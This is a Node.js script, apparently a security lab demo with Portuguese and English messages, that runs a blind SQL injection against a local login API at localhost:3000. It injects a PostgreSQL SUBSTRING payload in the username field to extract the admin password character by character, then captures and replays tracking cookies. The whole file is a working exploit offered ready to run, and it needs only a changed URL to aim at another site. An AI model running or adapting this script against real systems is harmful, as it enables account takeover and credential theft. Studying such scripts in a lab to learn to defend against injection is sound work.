const axios = require('axios');
const chalk = require('chalk');

const API_URL = 'http://localhost:3000/api/login';
const TARGET_USER = 'admin';
const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=';
const MAX_LENGTH = 30;

async function attemptLogin(payload) {
    try {
        const response = await axios.post(API_URL, {
            username: payload,
            password: 'anything'
        });

        return response.data;
    } catch (err) {
        console.error('Error making request:', err.message);
        return {success: false};
    }
}

async function extractPassword() {
    console.log(chalk.blueBright(`Starting blind SQL injection attack against ${TARGET_USER}...`));
    let extractedPassword = '';
    let finished = false;

    for (let i = 1; i <= MAX_LENGTH && !finished; i++) {
        console.log(chalk.yellow(`\n[Posição ${i}] Testando caracteres...`));
        let found = false;

        for (const char of CHARS) {
            // Ajuste para sintaxe PostgreSQL
            const payload = `${TARGET_USER}' AND SUBSTRING(password FROM ${i} FOR 1) = '${char}' --`;
            process.stdout.write(chalk.gray(`Testando: '${char}'\r`));
            const result = await attemptLogin(payload);

            if (result.success) {
                extractedPassword += char;
                found = true;
                console.log(chalk.green(`\n✔ Caractere encontrado na posição ${i}: '${char}'`));
                console.log(chalk.cyanBright(`Senha parcial: ${chalk.bold(extractedPassword)}`));
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 100));
        }

        if (!found) {
            console.log(chalk.red(`\nNenhum caractere encontrado na posição ${i}, extração finalizada.`));
            finished = true;
        }
    }

    if (extractedPassword.length > 0) {
        console.log(chalk.bgGreen.black(`\nSenha extraída para ${TARGET_USER}: ${extractedPassword}`));
    } else {
        console.log(chalk.bgRed.white(`\nFalha ao extrair a senha.`));
    }
    return extractedPassword;
}

// Function to extract tracking cookies
async function extractTrackingCookies() {
    try {
        console.log("\nExtracting tracking cookies...");

        // First request to get initial cookies (na rota raiz, onde o cookie é setado)
        const firstResponse = await axios.get('http://localhost:3000/', {
            withCredentials: true
        });

        const cookies = firstResponse.headers['set-cookie'] || [];
        if (cookies.length === 0) {
            console.log(chalk.redBright("Nenhum cookie de rastreamento recebido!\n" +
                "Dica: Verifique manualmente no navegador em Application > Cookies para visualizar o trackingId."));
        } else {
            console.log(chalk.greenBright("Tracking cookies obtained:"), cookies);
        }

        // Make multiple requests to demonstrate cookie tracking
        for (let i = 0; i < 3; i++) {
            console.log(`\nMaking request ${i + 1} with existing cookies...`);

            const response = await axios.get('http://localhost:3000/', {
                headers: {
                    Cookie: cookies.join('; ')
                }
            });

            // Server will log the repeated tracking ID
            console.log("Request successful, server is tracking this session");

            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        return cookies;
    } catch (err) {
        console.error("Error extracting tracking cookies:", err.message);
        return [];
    }
}

async function runExploitDemo() {
    console.log("BLIND SQL INJECTION AND TRACKING COOKIES EXPLOITATION DEMO");
    console.log("=======================================================\n");

    // Extract admin password using blind SQL injection
    console.log("PART 1: BLIND SQL INJECTION ATTACK");
    const password = await extractPassword();
    console.log(`\nExtracted password for ${TARGET_USER}: ${password}`);

    // Demonstrate tracking cookies
    console.log("\nPART 2: TRACKING COOKIES EXPLOITATION");
    const trackingCookies = await extractTrackingCookies();

    console.log("\nExploit demo completed!");
    console.log("=======================================================");
}

// Run the exploit
runExploitDemo();

